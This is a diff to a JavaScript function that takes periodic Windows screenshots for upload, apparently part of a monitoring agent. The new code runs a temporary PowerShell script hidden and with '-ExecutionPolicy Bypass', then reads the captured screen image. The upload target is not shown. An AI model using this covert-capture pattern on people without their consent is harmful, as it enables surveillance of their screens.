@@ -106,38 +106,39 @@ async function fetchInterval(token) {
 async function captureAndUpload(token) {
   try {
     const os   = require('os')
-    const { execSync } = require('child_process')
-    const tmpFile = path.join(os.tmpdir(), `sangria-sc-${Date.now()}.png`)
+    const { execFileSync } = require('child_process')
+    const tmpPng = path.join(os.tmpdir(), `sangria-sc-${Date.now()}.png`)
+    const tmpPs1 = path.join(os.tmpdir(), `sangria-sc-${Date.now()}.ps1`)
 
-    // Use PowerShell to capture screen — reliable on all Windows versions
-    // Works with DPI scaling, hardware acceleration, multi-monitor setups
+    // Write PowerShell script to a temp .ps1 file — avoids single-line escaping issues
     const psScript = `
 Add-Type -AssemblyName System.Windows.Forms
 Add-Type -AssemblyName System.Drawing
-$screens = [System.Windows.Forms.Screen]::AllScreens
-$top    = ($screens | Measure-Object -Property Bounds.Top    -Minimum).Minimum
-$left   = ($screens | Measure-Object -Property Bounds.Left   -Minimum).Minimum
-$width  = ($screens | Measure-Object -Property Bounds.Right  -Maximum).Maximum - $left
-$height = ($screens | Measure-Object -Property Bounds.Bottom -Maximum).Maximum - $top
-$bitmap = New-Object System.Drawing.Bitmap($width, $height)
-$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
-$graphics.CopyFromScreen($left, $top, 0, 0, $bitmap.Size)
-$bitmap.Save('${tmpFile.replace(/\\/g, '\\\\')}')
-$graphics.Dispose()
-$bitmap.Dispose()
+$screen = [System.Windows.Forms.Screen]::PrimaryScreen
+$bmp = New-Object System.Drawing.Bitmap($screen.Bounds.Width, $screen.Bounds.Height)
+$g = [System.Drawing.Graphics]::FromImage($bmp)
+$g.CopyFromScreen($screen.Bounds.Location, [System.Drawing.Point]::Empty, $screen.Bounds.Size)
+$bmp.Save('${tmpPng.replace(/\\/g, '\\\\')}', [System.Drawing.Imaging.ImageFormat]::Png)
+$g.Dispose()
+$bmp.Dispose()
 `
-    execSync(`powershell -NoProfile -NonInteractive -Command "${psScript.replace(/\n/g, ' ')}"`, {
-      timeout: 15000,
-      windowsHide: true,
-    })
+    fs.writeFileSync(tmpPs1, psScript, 'utf8')
 
-    if (!fs.existsSync(tmpFile)) {
+    execFileSync('powershell.exe', [
+      '-NoProfile', '-NonInteractive', '-ExecutionPolicy', 'Bypass',
+      '-File', tmpPs1,
+    ], { timeout: 20000, windowsHide: true })
+
+    // Clean up ps1 temp file
+    try { fs.unlinkSync(tmpPs1) } catch {}
+
+    if (!fs.existsSync(tmpPng)) {
       console.warn('[capture] Screenshot file not created')
       return false
     }
 
-    const imgBuffer = fs.readFileSync(tmpFile)
-    fs.unlinkSync(tmpFile) // clean up temp file
+    const imgBuffer = fs.readFileSync(tmpPng)
+    try { fs.unlinkSync(tmpPng) } catch {}
 
     if (!imgBuffer || imgBuffer.length < 1000) {
       console.warn('[capture] Screenshot too small:', imgBuffer?.length, 'bytes')
